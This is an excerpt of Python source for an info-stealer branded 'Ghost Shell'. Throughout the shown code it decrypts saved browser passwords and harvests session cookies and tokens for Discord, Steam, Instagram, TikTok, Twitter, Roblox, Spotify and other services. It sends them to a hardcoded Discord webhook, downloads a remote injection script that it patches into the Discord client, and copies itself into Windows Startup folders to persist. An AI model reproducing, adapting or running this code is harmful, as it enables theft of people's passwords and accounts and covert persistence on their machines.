...
class Main:
    ...
    async def GetPasswords(self) -> None:
        try:
            for path in self.profiles_full_path:
                # Skip Guest Profile
                if "Guest Profile" in path:
                    print(f"Skipping Guest Profile: {path}")
                    continue
                
                print(f"Processing profile path: {path}")  # Debugging print
                BrowserName = "None"
                ...
                print(f"User Data Part: {user_data_part}, Browser: {BrowserName}")  # Debugging print
                
                # Get the encryption key
                try:
                    key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                    print(f"Retrieved Key: {key}")  # Debugging print
                except Exception as e:
                    print(f"Error retrieving key: {e}")
                    continue  # Skip if key cannot be retrieved
                
                LoginData = os.path.join(path, "Login Data")
                if not os.path.exists(LoginData):
                    print(f"Login Data file does not exist: {LoginData}")
                    continue  # Skip profiles without Login Data file
                ...
                try:
                    ...
                    print(f"Logins fetched: {logins}")  # Debugging print
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except Exception as e:
                    print(f"Error processing login data: {e}")
                    continue  # Skip if there's an error processing the database

                for login in logins:
                    if login[0] and login[1] and login[2]:
                        decrypted_password = SubModules.Decrpytion(login[2], key)
                        print(f"Decrypted Password: {decrypted_password}")  # Debugging print
                        Variables.Passwords.append(f"URL : {login[0]}\nUsername : {login[1]}\nPassword : {decrypted_password}\nBrowser : {BrowserName}\n======================================================================\n")
        except Exception as e:
            print(f"Error in GetPasswords: {e}")  # Debugging print
            pass
            ...
            if os.path.isdir(ubisoft_path):
                ...
                if found_ubisoft == True:
                    ...
                    with open(os.path.join(copied_path,"How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("https://t.me/invisibleghostshell\n==============================================\n")
    ...
    async def RiotGamesSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    "title": "***Ghost Shell***",
                    "description": f"***Ghost Shell Riot Games Session was detected on the {browser} browser***",
                    "url" : "https://t.me/invisibleghostshell",
                    "color": 0,
                    "footer": {"text": "https://t.me/invisibleghostshell"},
    ...
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Ghost Shell***",
                "description": f"***Ghost Shell Instagram Session was detected on the {browser} browser***",
                "url" : "https://t.me/invisibleghostshell",
                "color": 0,
                "footer": {"text": "https://t.me/invisibleghostshell | https://github.com/quicaxd/Exela-V2.0"},
                "thumbnail": {"url": pp}}
            fields = [
                {"name": "Username", "value": "``" + username + "``", "inline": True},
    ...
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Ghost Shell***",
                "description": f"***Ghost Shell Tiktok Session was detected on the {browser} browser***",
                "url" : "https://t.me/invisibleghostshell",
                "color": 0,
                "footer": {"text": "https://t.me/invisibleghostshell"},
    ...
    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Ghost Shell***",
                "description": f"***Ghost Shell Twitter Session was detected on the {browser} browser***",
                "url" : "https://t.me/invisibleghostshell",
                "color": 0,
                "footer": {"text": "https://t.me/invisibleghostshell"},
                "thumbnail": {"url": pp}}
    ...
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Ghost Shell***",
                "description": f"***Ghost Shell Twitch Session was detected on the {browser} browser***",
                "url" : "https://t.me/invisibleghostshell",
                "color": 0,
                "footer": {"text": "https://t.me/invisibleghostshell"},
                "thumbnail": {"url": pp}}
    ...
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Ghost Shell***",
                "description": f"***Ghost Shell Spotify Session was detected on the {browser} browser***",
                "url" : "https://t.me/invisibleghostshell",
                "color": 0,
                "footer": {"text": "https://t.me/invisibleghostshell"},
    ...
    async def RedditSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Ghost Shell***",
                "description": f"***Ghost Shell Reddit Session was detected on the {browser} browser***",
                "url" : "https://t.me/invisibleghostshell",
                "color": 0,
                "footer": {"text": "https://t.me/invisibleghostshell"},
                "thumbnail": {"url": pp}}
    ...
    async def RobloxSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                ...
                embed_data = {
                    "title": "***Ghost Shell***",
                    "description": f"***Ghost Shell Roblox Session was detected on the {browser} browser***",
                    "url" : "https://t.me/invisibleghostshell",
                    "color": 0,
                    "footer": {"text": "https://t.me/invisibleghostshell"},
                    "thumbnail": {"url": pp}}
    ...
    async def ValidateTokenAndGetInfo(self, token:str) -> None:
        try:
            ...
            if data:
                embed_data = {
                "title": "***Ghost Shell***",
                "description": f"***Ghost Shell Validated Discord Token Detected***",
                "url" : "https://t.me/invisibleghostshell",
                "color": 0,
                "footer": {"text": "https://t.me/invisibleghostshell"},
                "thumbnail": {"url": ""}}
                    ...
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        ...
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                ...
                                embed_data = {
                                    "title": "***Ghost Shell***",
                                    "description": f"***Ghost Shell Steam Session Detected***",
    ...
    async def SendAllData(self) -> None:
        ...
        embed_data = {
            "title": "***Ghost Shell***",
            "description": f"***Ghost Shell Full Info***",
            "url" : "https://t.me/invisibleghostshell",
            "color": 0,
            "footer": {"text": "https://t.me/invisibleghostshell "},
            "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
                        ...
                        with open(indexPath, "r", encoding="utf-8", errors="ignore") as file:
                            if not webhook in file.read():
                                ...
                                with open(indexPath, "w", encoding="utf-8", errors="ignore") as x:
                                    x.write(injection_code.replace("https://discord.com/api/webhooks/1267315418759036978/IjLqzUgg9IgO3WUsqMOdqSffTYCX_m_UDAWLHuzbOVTK0U5fvNaDjVCUVvWJx08pMSdQ",webhook))
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://raw.githubusercontent.com/justforExela/injection/main/injection.js") as response:
                    data = await response.text()
                    return data.replace("https://discord.com/api/webhooks/1267315418759036978/IjLqzUgg9IgO3WUsqMOdqSffTYCX_m_UDAWLHuzbOVTK0U5fvNaDjVCUVvWJx08pMSdQ", webhook)
        except Exception as error:
...
class Startup:
    def __init__(self) -> None:
        ...
        self.ToPath:str = os.path.join(self.LocalAppData, "ExelaUpdateService", "winscr.exe")
    ...
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath): # if the startup file already exist, return
                ...
                os.mkdir(self.ToPath.replace("winscr.exe", "")) # Create Directory
    ...
    async def FolderStartup(self): # folder method for startup
        try:
            if self.Privalage: #if the code running admin privilage, copy to common startup path
                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\winscr.exe"):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\winscr.exe")
            else: #if the code not running admin privilage, copy to normal startup path
                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "winscr.exe")):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "winscr.exe"))
        except Exception as e:
            print(str(e))
